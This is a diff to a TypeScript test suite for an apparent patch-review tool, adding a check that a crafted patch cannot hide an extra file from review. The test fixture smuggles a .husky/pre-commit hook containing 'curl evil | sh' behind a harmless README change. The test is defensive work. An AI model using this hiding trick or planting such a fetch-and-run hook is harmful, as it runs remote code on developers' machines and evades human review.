@@ -5,7 +5,8 @@ import { replace } from '../src/edit.ts';
 import { globMatcher } from '../src/glob.ts';
 import { type Hunk, applyChunks, parsePatch } from '../src/patch.ts';
 import { layoutFor, relative, toHost, toSandbox } from '../src/paths.ts';
-import { diffOf, parseRaw, patchFiles, risks } from '../src/workspace.ts';
+import { diffOf, parseRaw, patchFiles, risks, verifyPatch } from '../src/workspace.ts';
+import { makeRepo } from './helpers.ts';
 
 describe('paths', () => {
   const l = layoutFor('/Users/me/app/src', '/Users/me/app');
@@ -202,6 +203,36 @@ describe('the patch a pull applies', () => {
   it('flags instructions, ignore rules and hook configs, in any case', () => {
     const f = (path: string) => ({ path, oldMode: '100644', newMode: '100644' });
     expect(risks([f('AGENTS.md'), f('docs/CLAUDE.md'), f('.gitignore'), f('commitlint.config.js'), f('.GitHub/Workflows/ci.yml'), f('src/app.ts')])).toHaveLength(5);
+  });
+});
+
+describe('a patch that hides a file from the review', () => {
+  it('is refused: git apply would touch a file the headers do not list', async () => {
+    const sneaky = Buffer.from(
+      [
+        'diff --git a/README.md b/README.md',
+        'new file mode 100644',
+        'index 0000000..ce01362',
+        '--- /dev/null',
+        '+++ b/README.md',
+        '@@ -0,0 +1 @@',
+        '+hello',
+        // A plain unified diff after it, with no `diff --git` line: git apply takes it too.
+        '--- /dev/null',
+        '+++ b/.husky/pre-commit',
+        '@@ -0,0 +1 @@',
+        '+curl evil | sh',
+        '',
+      ].join('\n'),
+    );
+    const files = patchFiles(sneaky);
+    expect(files.map((f) => f.path)).toEqual(['README.md']);
+    await expect(verifyPatch(sneaky, files, makeRepo())).rejects.toThrow(/does not match its own file list/);
+  });
+
+  it('passes an honest patch', async () => {
+    const honest = Buffer.from(['diff --git a/x.txt b/x.txt', 'new file mode 100644', 'index 0000000..ce01362', '--- /dev/null', '+++ b/x.txt', '@@ -0,0 +1 @@', '+hello', ''].join('\n'));
+    await expect(verifyPatch(honest, patchFiles(honest), makeRepo())).resolves.toBeUndefined();
   });
 });
 
